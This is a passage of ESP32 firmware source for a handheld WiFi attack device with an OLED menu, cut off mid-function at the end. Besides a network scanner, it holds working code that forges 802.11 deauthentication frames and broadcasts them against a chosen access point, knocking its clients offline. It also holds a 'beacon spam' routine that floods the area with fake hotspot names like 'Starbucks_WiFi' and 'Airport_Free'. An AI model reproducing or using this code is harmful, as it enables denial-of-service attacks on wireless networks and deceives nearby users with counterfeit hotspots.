extern void displayShowMessage(const char* msg, int delayMs);
extern bool displayCheckButton(int pin);

#define BTN_BACK 26
#define BTN_OK 12
#define BTN_UP 15
#define BTN_DOWN 13

void wifiScan() {
    displayShowMessage("Scanning WiFi networks...", 500);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200);
    
    wifiNetworkCount = WiFi.scanNetworks();
    if (wifiNetworkCount > 50) wifiNetworkCount = 50;
    
    for (int i = 0; i < wifiNetworkCount; i++) {
        wifiNetworkNames[i] = WiFi.SSID(i);
        if (wifiNetworkNames[i].length() == 0) wifiNetworkNames[i] = "<Hidden>";
        wifiNetworkChannel[i] = WiFi.channel(i);
        wifiNetworkRSSI[i] = WiFi.RSSI(i);
        memcpy(wifiNetworkBSSID[i], WiFi.BSSID(i), 6);
    }
    
    wifiDisplayScanResults();
    WiFi.mode(WIFI_AP_STA);
}

void wifiDisplayScanResults() {
    u8g2.clearBuffer();
    displayDrawTopBar();
    u8g2.setFont(u8g2_font_6x10_tr);
    
    char buf[32];
    sprintf(buf, "Networks found: %d", wifiNetworkCount);
    u8g2.drawStr(5, 20, buf);
    
    for (int i = 0; i < min(wifiNetworkCount, 6); i++) {
        String name = wifiNetworkNames[i];
        if (name.length() > 14) name = name.substring(0, 12) + "..";
        u8g2.drawStr(5, 35 + i * 8, name.c_str());
    }
    
    u8g2.sendBuffer();
    delay(2000);
}

void wifiSendDeauthPacket(uint8_t* bssid, uint8_t* client, int channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    uint8_t packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        client[0], client[1], client[2], client[3], client[4], client[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x07, 0x00
    };
    
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    wifiDeauthPackets++;
}

void wifiStartDeauth() {
    if (wifiNetworkCount == 0) {
        displayShowMessage("Run SCAN first!", 1000);
        return;
    }
    
    int target = 0;
    while (true) {
        u8g2.clearBuffer();
        displayDrawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 15, "Select target AP:");
        
        for (int i = 0; i < min(wifiNetworkCount, 5); i++) {
            if (i == target) u8g2.drawStr(5, 30 + i * 8, ">");
            u8g2.drawStr(20, 30 + i * 8, wifiNetworkNames[i].substring(0, 14).c_str());
        }
        
        u8g2.drawStr(5, 60, "UP/DOWN=select OK=start BACK");
        u8g2.sendBuffer();
        
        if (displayCheckButton(BTN_UP) && target > 0) target--;
        else if (displayCheckButton(BTN_DOWN) && target < min(wifiNetworkCount, 5) - 1) target++;
        else if (displayCheckButton(BTN_OK)) break;
        else if (displayCheckButton(BTN_BACK)) return;
        delay(50);
    }
    
    wifiDeauthActive = true;
    wifiDeauthPackets = 0;
    int ch = wifiNetworkChannel[target];
    uint8_t* bssid = wifiNetworkBSSID[target];
    uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    displayShowMessage(("Deauth on: " + wifiNetworkNames[target]).c_str(), 1000);
    
    while (wifiDeauthActive) {
        wifiSendDeauthPacket(bssid, broadcast, ch);
        
        u8g2.clearBuffer();
        displayDrawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(20, 25, "DEAUTH ACTIVE");
        u8g2.setFont(u8g2_font_6x10_tr);
        
        char buf[32];
        sprintf(buf, "Target: %s", wifiNetworkNames[target].substring(0, 12).c_str());
        u8g2.drawStr(5, 40, buf);
        sprintf(buf, "Packets: %lu", wifiDeauthPackets);
        u8g2.drawStr(5, 52, buf);
        u8g2.drawStr(5, 62, "BACK - Stop");
        u8g2.sendBuffer();
        
        if (displayCheckButton(BTN_BACK)) wifiDeauthActive = false;
        delay(50);
    }
    displayShowMessage("Deauth stopped", 1000);
}

void wifiStopDeauth() {
    wifiDeauthActive = false;
}

void wifiStartBeacon() {
    wifiBeaconActive = true;
    wifiBeaconPackets = 0;
    
    const char* ssids[] = {"FREE_WIFI", "Starbucks_WiFi", "Airport_Free", "Metro_Free", 
                           "PublicWiFi", "VPN_Secure", "Guest_Network", "Hotel_WiFi"};
    int ssidCount = 8;
    
    displayShowMessage("Beacon spam started", 1000);
    
    while (wifiBeaconActive) {
        for (int s = 0; s < ssidCount && wifiBeaconActive; s++) {
            uint8_t bssid[6];
            for (int i = 0; i < 6; i++) bssid[i] = random(256);
            bssid[0] |= 0x02;
            
            uint8_t packet[200];
            int len = 0;
            packet[len++] = 0x80; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = 0x00;
            
            for (int i = 0; i < 6; i++) packet[len++] = 0xFF;
            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
            
            packet[len++] = 0x00; packet[len++] = 0x00;
            for (int i = 0; i < 8; i++) packet[len++] = 0x00;
            packet[len++] = 0x64; packet[len++] = 0x00;
            packet[len++] = 0x11; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = strlen(ssids[s]);
            
            for (int i = 0; i < (int)strlen(ssids[s]); i++) packet[len++] = ssids[s][i];
            esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
            wifiBeaconPackets++;
        }
        
        u8g2.clearBuffer();
        displayDrawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
